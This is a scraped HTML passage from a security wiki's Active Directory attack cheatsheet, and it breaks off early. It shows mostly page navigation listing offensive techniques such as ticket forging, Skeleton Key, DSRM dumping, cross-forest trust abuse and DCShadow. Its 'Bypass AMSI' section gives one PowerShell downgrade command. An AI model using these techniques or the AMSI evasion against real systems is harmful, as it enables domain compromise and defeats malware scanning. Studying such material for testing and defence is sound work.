                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-retrieve-the-krbtgt-" class="text-limit-lines-1 block">Retrieve the krbtgt hash</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-create-tgt" class="text-limit-lines-1 block">Create TGT</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-silver-ticket" class="text-limit-lines-1 block">Silver Ticket</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-create-tgs" class="text-limit-lines-1 block">Create TGS</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-skeleton-key" class="text-limit-lines-1 block">Skeleton Key</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-dsrm" class="text-limit-lines-1 block">DSRM</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-dump-dsrm-password" class="text-limit-lines-1 block">Dump DSRM password</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-change-registry-conf" class="text-limit-lines-1 block">Change registry configuration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-custom-ssp" class="text-limit-lines-1 block">Custom SSP</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls---adminsdholder" class="text-limit-lines-1 block">ACLs - AdminSDHolder</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-attack" class="text-limit-lines-1 block">Attack</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-run-sdprop-manually" class="text-limit-lines-1 block">Run SDProp manually</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-check-domain-admin-a" class="text-limit-lines-1 block">Check Domain Admin ACLs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls---interesting-r" class="text-limit-lines-1 block">ACLs - Interesting rights</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls---security-decr" class="text-limit-lines-1 block">ACLs - Security Decriptors</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-wmi" class="text-limit-lines-1 block">WMI</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-powershell-remoting-0" class="text-limit-lines-1 block">PowerShell Remoting</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-remote-registry" class="text-limit-lines-1 block">Remote Registry</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-cross-trust-movement" class="text-limit-lines-1 block">Cross-Trust Movement</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-child-to-parent-doma" class="text-limit-lines-1 block">Child To Parent Domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-the-trust-key" class="text-limit-lines-1 block">With the trust key</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-the-krbtgt-hash" class="text-limit-lines-1 block">With the krbtgt hash</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-across-forest---inbo" class="text-limit-lines-1 block">Across Forest - Inbound trust</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-get-the-trust-key" class="text-limit-lines-1 block">Get the Trust Key</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-get-the-foreignsecur" class="text-limit-lines-1 block">Get the ForeignSecurityPrincipal</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-forge-the-inter-fore" class="text-limit-lines-1 block">Forge the inter-forest TGT</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-create-a-tgs-with-th-0" class="text-limit-lines-1 block">Create a TGS with the previous TGT and access service</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-across-forest---pam-" class="text-limit-lines-1 block">Across Forest - PAM Trust</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-check-if-the-current" class="text-limit-lines-1 block">Check if the current forest is a bastion forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-check-if-the-current-0" class="text-limit-lines-1 block">Check if the current forest is managed by a bastion forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-mssql-server" class="text-limit-lines-1 block">MSSQL Server</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-forest-persistence--" class="text-limit-lines-1 block">Forest Persistence - DCShadow</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-minimal-permissions" class="text-limit-lines-1 block">Minimal permissions</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-set-interesting-attr" class="text-limit-lines-1 block">Set interesting attributes</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-set-sidhistory-to-en" class="text-limit-lines-1 block">Set SIDHistory to Enterprise Admin</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-modify-primarygroupi" class="text-limit-lines-1 block">Modify primaryGroupID</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-modify-ntsecuritydes" class="text-limit-lines-1 block">Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-set-a-spn-on-an-user" class="text-limit-lines-1 block">Set a SPN on an user</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-shadowception" class="text-limit-lines-1 block">Shadowception</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-get-the-acls" class="text-limit-lines-1 block">Get the ACLs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-stack-the-queries" class="text-limit-lines-1 block">Stack the queries</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-references" class="text-limit-lines-1 block">References</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                    </div>
            </div>
        </nav>
    
    <nav id="book-tree" class="book-tree mb-xl" aria-label="Book Navigation">

    <h5>Book Navigation</h5>

    <ul class="sidebar-page-list mt-xs menu entity-list">
                    <li class="list-item-book book">
                <a href="https://hideandsec.sh/books/cheatsheets-82c" class="book   entity-list-item" data-entity-type="book" data-entity-id="30">
    <span role="presentation" class="icon text-book"><svg class="svg-icon" data-icon="book" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Cheatsheets</h4>
            
    </div>
</a>            </li>
        
                    <li class="list-item-page page ">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/pivoting" class="page   entity-list-item" data-entity-type="page" data-entity-id="56">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Pivoting</h4>
            
    </div>
</a>
                
            </li>
                    <li class="list-item-chapter chapter ">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/chapter/microsoft" class="chapter   entity-list-item" data-entity-type="chapter" data-entity-id="30">
    <span role="presentation" class="icon text-chapter"><svg class="svg-icon" data-icon="chapter" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 9H9V9h10v2zm-4 4H9v-2h6v2zm4-8H9V5h10v2z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Microsoft</h4>
            
    </div>
</a>
                                    <div class="entity-list-item no-hover">
                        <span role="presentation" class="icon text-chapter"></span>
                        <div class="content">
                            <div class="chapter-child-menu">
    <button chapter-toggle="" type="button" aria-expanded="true" class="text-muted  open ">
        <svg class="svg-icon" data-icon="caret-right" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 17.5l5-5-5-5z"></path><path d="M0 0h24v24H0z" fill="none"></path></svg> <svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg> <span>3 Pages</span>
    </button>
    <ul class="sub-menu inset-list  open " style="display: block;" role="menu">
                    <li class="list-item-page " role="presentation">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory" class="page  selected entity-list-item" data-entity-type="page" data-entity-id="59">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Active Directory</h4>
            
    </div>
</a>            </li>
                    <li class="list-item-page " role="presentation">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services" class="page   entity-list-item" data-entity-type="page" data-entity-id="66">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Active Directory Certificate Services</h4>
            
    </div>
</a>            </li>
                    <li class="list-item-page " role="presentation">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition" class="page   entity-list-item" data-entity-type="page" data-entity-id="71">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Active Directory - Python edition</h4>
            
    </div>
</a>            </li>
            </ul>
</div>                        </div>
                    </div>

                
            </li>
                    <li class="list-item-page page ">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/reverse-shells" class="page   entity-list-item" data-entity-type="page" data-entity-id="73">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Reverse shells</h4>
            
    </div>
</a>
                
            </li>
                    <li class="list-item-page page ">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells" class="page   entity-list-item" data-entity-type="page" data-entity-id="74">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Spawning TTY Shells</h4>
            
    </div>
</a>
                
            </li>
                    <li class="list-item-page page ">
                <a href="https://hideandsec.sh/books/cheatsheets-82c/page/bug-bounty" class="page   entity-list-item" data-entity-type="page" data-entity-id="78">
    <span role="presentation" class="icon text-page"><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
    <div class="content">
            <h4 class="entity-list-item-name break-text">Bug Bounty</h4>
            
    </div>
</a>
                
            </li>
            </ul>
</nav>            </aside>
        </div>

        <div class=" tri-layout-middle">
            <div id="main-content" class="tri-layout-middle-contents">
                
    <div class="mb-m print-hidden">
        <nav class="breadcrumbs text-center" aria-label="Breadcrumb">
    
    
            <a href="https://hideandsec.sh/books" class="text-book icon-list-item outline-hover">
            <span><svg class="svg-icon" data-icon="books" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"></path><path d="M19.252 1.708H8.663a1.77 1.77 0 0 0-1.765 1.764v14.12c0 .97.794 1.764 1.765 1.764h10.59a1.77 1.77 0 0 0 1.764-1.765V3.472a1.77 1.77 0 0 0-1.765-1.764zM8.663 3.472h4.412v7.06L10.87 9.208l-2.206 1.324z"></path><path d="M30.61 3.203h24v24h-24z" fill="none"></path><path d="M2.966 6.61v14c0 1.1.9 2 2 2h14v-2h-14v-14z"></path></svg></span>
            <span>Books</span>
        </a>
            
    
    
            
                
                                    <div class="dropdown-search" components="dropdown dropdown-search" option:dropdown-search:url="/search/entity/siblings?entity_type=book&amp;entity_id=30" option:dropdown-search:local-search-selector=".entity-list-item">
    <div class="dropdown-search-toggle" refs="dropdown@toggle" aria-haspopup="true" aria-expanded="false" tabindex="0">
        <div class="separator"><svg class="svg-icon" data-icon="chevron-right" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path><path d="M0 0h24v24H0z" fill="none"></path></svg></div>
    </div>
    <div refs="dropdown@menu" class="dropdown-search-dropdown card" role="menu">
        <div class="dropdown-search-search">
            <svg class="svg-icon" data-icon="search" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg>            <input refs="dropdown-search@searchInput" aria-label="Search" autocomplete="off" placeholder="Search" type="text">
        </div>
        <div refs="dropdown-search@loading">
            <div class="loading-container">
    <div></div>
    <div></div>
    <div></div>
    </div>        </div>
        <div refs="dropdown-search@listContainer" class="dropdown-search-list px-m"></div>
    </div>
</div>                        <a href="https://hideandsec.sh/books/cheatsheets-82c" class="text-book icon-list-item outline-hover">
                <span><svg class="svg-icon" data-icon="book" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"></path>
</svg></span>
                <span>
                    Cheatsheets
                </span>
            </a>
                            
                
                                    <div class="dropdown-search" components="dropdown dropdown-search" option:dropdown-search:url="/search/entity/siblings?entity_type=chapter&amp;entity_id=30" option:dropdown-search:local-search-selector=".entity-list-item">
    <div class="dropdown-search-toggle" refs="dropdown@toggle" aria-haspopup="true" aria-expanded="false" tabindex="0">
        <div class="separator"><svg class="svg-icon" data-icon="chevron-right" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path><path d="M0 0h24v24H0z" fill="none"></path></svg></div>
    </div>
    <div refs="dropdown@menu" class="dropdown-search-dropdown card" role="menu">
        <div class="dropdown-search-search">
            <svg class="svg-icon" data-icon="search" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg>            <input refs="dropdown-search@searchInput" aria-label="Search" autocomplete="off" placeholder="Search" type="text">
        </div>
        <div refs="dropdown-search@loading">
            <div class="loading-container">
    <div></div>
    <div></div>
    <div></div>
    </div>        </div>
        <div refs="dropdown-search@listContainer" class="dropdown-search-list px-m"></div>
    </div>
</div>                        <a href="https://hideandsec.sh/books/cheatsheets-82c/chapter/microsoft" class="text-chapter icon-list-item outline-hover">
                <span><svg class="svg-icon" data-icon="chapter" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 9H9V9h10v2zm-4 4H9v-2h6v2zm4-8H9V5h10v2z"></path>
</svg></span>
                <span>
                    Microsoft
                </span>
            </a>
                            
                
                                    <div class="dropdown-search" components="dropdown dropdown-search" option:dropdown-search:url="/search/entity/siblings?entity_type=page&amp;entity_id=59" option:dropdown-search:local-search-selector=".entity-list-item">
    <div class="dropdown-search-toggle" refs="dropdown@toggle" aria-haspopup="true" aria-expanded="false" tabindex="0">
        <div class="separator"><svg class="svg-icon" data-icon="chevron-right" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path><path d="M0 0h24v24H0z" fill="none"></path></svg></div>
    </div>
    <div refs="dropdown@menu" class="dropdown-search-dropdown card" role="menu">
        <div class="dropdown-search-search">
            <svg class="svg-icon" data-icon="search" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg>            <input refs="dropdown-search@searchInput" aria-label="Search" autocomplete="off" placeholder="Search" type="text">
        </div>
        <div refs="dropdown-search@loading">
            <div class="loading-container">
    <div></div>
    <div></div>
    <div></div>
    </div>        </div>
        <div refs="dropdown-search@listContainer" class="dropdown-search-list px-m"></div>
    </div>
</div>                        <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory" class="text-page icon-list-item outline-hover">
                <span><svg class="svg-icon" data-icon="page" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path>
</svg></span>
                <span>
                    Active Directory
                </span>
            </a>
                    </nav>    </div>

    <main class="content-wrap card">
        <div class="page-content clearfix" page-display="59">
                        <div dir="auto">

    <h1 class="break-text" id="bkmrk-page-title">Active Directory</h1>

    <div style="clear:left;"></div>

            <p id="bkmrk-this-cheatsheet-is-b">This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter <a href="https://twitter.com/BlWasp_"><strong>@BlWasp_</strong></a>.</p>
<p id="bkmrk-i-will-try-to-put-as">I will try to put as many links as possible at the end of the page to direct to more complete resources.</p>
<h2 id="bkmrk-misc">Misc</h2>
<h3 id="bkmrk-bypass-amsi">Bypass AMSI</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 2786px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 379px; min-width: 2786.43px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Downgrade PowerShell</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">powershell</span> <span class="cm-operator">-</span><span class="cm-identifier">v</span> <span class="cm-number">2</span> <span class="cm-operator">-</span><span class="cm-identifier">c</span> <span class="cm-string">"&lt;...&gt;"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Classic</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: 